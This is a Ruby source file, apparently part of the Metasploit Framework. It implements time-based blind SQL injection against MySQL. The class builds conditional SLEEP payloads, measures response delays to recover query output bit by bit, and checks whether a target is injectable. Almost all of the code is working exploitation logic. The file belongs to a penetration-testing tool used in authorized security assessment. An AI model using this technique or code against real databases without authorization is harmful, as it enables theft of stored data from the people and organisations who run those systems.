#
#   Time-Based Blind SQL injection support for MySQL
#
class Msf::Exploit::SQLi::MySQLi::TimeBasedBlind < Msf::Exploit::SQLi::MySQLi
  def initialize(opts, &query_proc)
    # TODO: automatically detect the sleep delay? here or in run_sql?
    @sleepdelay = opts[:sleepdelay] || 1
    super
  end

  def run_sql(query)
    # TODO: detect latency and update sleepdelay manually?
    puts "[*] Executing (#{query})" if @verbose
    if @hex_encode
      query = hex_encode(query)
      puts "[*] Encoded to (#{query})" if @verbose
    end
    # first, get the length of the output
    reversed_output_length = 0
    i = 0
    loop do
      output_bit = blind_request("if(1=substr(bin(length((#{query}))), #{i + 1}, 1),sleep(#{@sleepdelay}),0)")
      reversed_output_length |= (1 << i) if output_bit
      i += 1
      stop = blind_request("if(''=substr(bin(length((#{query}))), #{i + 1}, 1),sleep(#{@sleepdelay}),0)")
      break if stop # substr returned an empty string, end of input
    end
    # reverse the bits in reversed_output_length
    output_length = 0
    i.times do
      output_length <<= 1
      output_length |= reversed_output_length & 1
      reversed_output_length >>= 1
    end
    puts "[*] Time-based injection: expecting output of length #{output_length}" if @verbose
    # now, get the output, of the given length
    print '[+] Data: ' if @verbose
    output = output_length.times.map do |j|
      current_character = 0
      8.times do |k|
        # the query below: the inner substr returns a character from the result, the outer returns a bit of it
        output_bit = blind_request("if(1=substr(lpad(bin(ascii(substr((#{query}), #{j + 1}, 1))), 8,'0'),#{k + 1},1),sleep(#{@sleepdelay}),0)")
        current_character |= (1 << (7 - k)) if output_bit
      end
      extracted_char = current_character.chr
      print extracted_char if @verbose
      extracted_char
    end.join
    print "\n" if @verbose
    output
  end

  #
  # This method checks if the target is vulnerable to Blind time-based injection by checking if
  # the target sleeps only when a given condition is true.
  #
  def test_vulnerable
    # run_sql and check if output is what's expected, or just check for delays?
    out_true = blind_request("if(1=1,sleep(#{@sleepdelay}),0)")
    out_false = blind_request("if(1=2,sleep(#{@sleepdelay}),0)")
    out_true && !out_false
  end

  private

  def check_opts(opts)
    super
  end

  def blind_request(query)
    time = Time.now
    @query_proc.call(@prefix + query + @suffix)
    diff = Time.now - time
    diff >= @sleepdelay
  end

  def hex_encode(query)
    super
  end
end
